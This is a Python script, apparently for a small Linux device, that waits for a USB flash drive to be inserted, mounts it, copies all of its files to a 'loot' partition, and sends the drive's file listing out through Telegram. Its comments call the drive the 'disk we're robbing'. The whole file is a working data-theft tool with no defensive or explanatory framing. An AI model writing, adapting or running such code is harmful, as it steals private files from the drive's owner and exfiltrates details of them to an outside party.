#!/usr/bin/python
import time
import os
import sys
from telegram import Telegram

telegram = Telegram("/mnt/blackhat.conf")

def bash(cmd, sudo=False, suppress_output=False):
    if sudo:
        cmd = f"sudo {cmd}"

    if suppress_output:
        cmd = f"{cmd} 2>/dev/null"

    return os.popen(cmd).read()


if __name__ == "__main__":
    TARGET_DISK = "/dev/sda1"     # Name of disk we're robbing
    LOOT_DISK = "/dev/mmcblk0p2"  # Out disk
    LOOT_MOUNT_POINT = "/media/loot"
    TARGET_MOUNT_POINT = "/media/target"

    ret = bash(f"lsblk -f {LOOT_DISK}")
    if "not a block device" in ret:
        print(f"Partition has not been created: {LOOT_DISK}")
        sys.exit()

    if "vfat" not in ret:
        print(f"Created fat32 fs on {LOOT_DISK}")
        bash(f"mkfs.vfat -F 32 {LOOT_DISK}")

    bash(f"mkdir {LOOT_MOUNT_POINT}", suppress_output=True)
    bash(f"mkdir {TARGET_MOUNT_POINT}", suppress_output=True)

    retries = 0
    print("Insert Flash Drive")
    while(True):
        time.sleep(1)
        output = bash(f"file {TARGET_DISK}")
        if "No such file or directory" in output:
            retries += 1
            if retries > 10:
                print("No drive, quitting")
                sys.exit()
            else:
                print("No drive, retrying")
                continue
        elif "/dev/sda1" in output:
            print("Mounting")
            break

    bash(f"mount {TARGET_DISK} {TARGET_MOUNT_POINT}")
    bash(f"mount {LOOT_DISK} {LOOT_MOUNT_POINT}")

    print("Disk Mounted...")
    print("Contents...")
    con = bash(f"ls -1 --color=never {TARGET_MOUNT_POINT}")
    print(con)
    telegram.send(f"{con}")

    print("Copying Contents")
    bash(f"cp -r {TARGET_MOUNT_POINT}/* {LOOT_MOUNT_POINT}/")
    print("Done")

    bash(f"umount {TARGET_MOUNT_POINT}")
    bash(f"umount {LOOT_MOUNT_POINT}")
